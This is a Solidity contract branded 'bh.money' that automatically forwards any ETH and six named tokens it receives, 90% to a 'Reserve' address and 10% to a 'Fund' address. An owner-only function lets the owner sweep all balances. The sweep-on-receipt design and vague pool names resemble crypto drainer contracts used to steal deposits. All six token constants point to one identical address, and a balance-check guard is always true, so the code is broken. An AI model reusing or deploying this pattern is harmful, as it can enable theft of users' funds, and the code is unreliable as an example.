// SPDX-License-Identifier: MIT
/*  __    __                                      
   / /_  / /_    ____ ___  ____  ____  ____  __  __
  / __ \/ __ \  / __ `__ \/ __ \/ __ \/ _  \/ / / /
 / /_/ / / / / / / / / / / /_/ / / / /  __ / /_/ / 
/_.___/_/ /_(_)_/ /_/ /_/\____/_/ /_/\____/\__, /  
                                          /____/  */

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Contract_2 is Ownable {
    //////////////////
    IERC20 internal USDT;
    IERC20 internal USDC;
    IERC20 internal WBTC;
    IERC20 internal MATIC;
    IERC20 internal BNB;
    IERC20 internal DAI;
    //////////////////
    address payable Reserve;
    address payable Fund;

    constructor(address _Pool_1, address _Pool_2) {
        //////////////////
        USDT = IERC20(0x56742334E387923B25dD4D4E1c5EEfBAcFba8E10); 
        USDC = IERC20(0x56742334E387923B25dD4D4E1c5EEfBAcFba8E10); 
        WBTC = IERC20(0x56742334E387923B25dD4D4E1c5EEfBAcFba8E10); 
        MATIC = IERC20(0x56742334E387923B25dD4D4E1c5EEfBAcFba8E10); 
        BNB = IERC20(0x56742334E387923B25dD4D4E1c5EEfBAcFba8E10); 
        DAI = IERC20(0x56742334E387923B25dD4D4E1c5EEfBAcFba8E10); 
        //////////////////
        Reserve = payable(_Pool_1);
        Fund = payable(_Pool_2);
    }

    function TransferPool() private {
        //////////////////
        uint256 usdt = USDT.balanceOf(address(this));
        uint256 usdc = USDC.balanceOf(address(this));
        uint256 wbtc = WBTC.balanceOf(address(this));
        uint256 matic = MATIC.balanceOf(address(this));
        uint256 bnb = BNB.balanceOf(address(this));
        uint256 dai = DAI.balanceOf(address(this));

        //////////////////
        uint256 t1_90_per = (usdt * 90) / 100;
        USDT.transfer(Reserve, t1_90_per);
        uint256 t1_10_per = (usdt * 10) / 100;
        USDT.transfer(Fund, t1_10_per);
        //////////////////
        uint256 t2_90_per = (usdc * 90) / 100;
        USDC.transfer(Reserve, t2_90_per);
        uint256 t2_10_per = (usdc * 10) / 100;
        USDC.transfer(Fund, t2_10_per);
        //////////////////
        uint256 t3_90_per = (wbtc * 90) / 100;
        WBTC.transfer(Reserve, t3_90_per);
        uint256 t3_10_per = (wbtc * 10) / 100;
        WBTC.transfer(Fund, t3_10_per);
        //////////////////
        uint256 t4_90_per = (matic * 90) / 100;
        MATIC.transfer(Reserve, t4_90_per);
        uint256 t4_10_per = (matic * 10) / 100;
        MATIC.transfer(Fund, t4_10_per);
        //////////////////
        uint256 t5_90_per = (bnb * 90) / 100;
        BNB.transfer(Reserve, t5_90_per);
        uint256 t5_10_per = (bnb * 10) / 100;
        BNB.transfer(Fund, t5_10_per);
        //////////////////
        uint256 t6_90_per = (dai * 90) / 100;
        DAI.transfer(Reserve, t6_90_per);
        uint256 t6_10_per = (dai * 10) / 100;
        DAI.transfer(Fund, t6_10_per);        
    }

    function manualTransfer() external onlyOwner {
        TransferPool();
    }

    function CheckBalance(uint256 _pid) public view returns (uint256) {
        require(_pid >= 0 || _pid <= 6, "Please Select Correct Token!!");
        if(_pid == 0) { return address(this).balance; }
        else if(_pid == 1) { return USDT.balanceOf(address(this)); }
        else if(_pid == 2) { return USDC.balanceOf(address(this)); }
        else if(_pid == 3) { return WBTC.balanceOf(address(this)); }
        else if(_pid == 4) { return MATIC.balanceOf(address(this)); }
        else if(_pid == 5){ return BNB.balanceOf(address(this)); }
        else if(_pid == 6) { return DAI.balanceOf(address(this)); }
        else{ revert("ERROR! Please Select Correct Id"); }
    }

    function EmergencyPause() public onlyOwner {
        USDT.transfer(msg.sender, USDT.balanceOf(address(this)));
        USDC.transfer(msg.sender, USDC.balanceOf(address(this)));
        WBTC.transfer(msg.sender, WBTC.balanceOf(address(this)));
        MATIC.transfer(msg.sender, MATIC.balanceOf(address(this)));
        BNB.transfer(msg.sender, BNB.balanceOf(address(this)));
        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));
        (bool os, ) = payable(msg.sender).call{value : address(this).balance}("");
        require(os,"Failed!!");
    }

    receive() external payable {
        uint256 coin = address(this).balance;
        
        uint256 c1_90_per = (coin * 90) / 100;
        (bool os1, ) = payable(Reserve).call{value : c1_90_per}("");
        require(os1,"Failed!!");
        uint256 c1_10_per = (coin * 10) / 100;
        (bool os2, ) = payable(Fund).call{value : c1_10_per}("");
        require(os2,"Failed!!");

        //////////////////
        TransferPool();
    }
}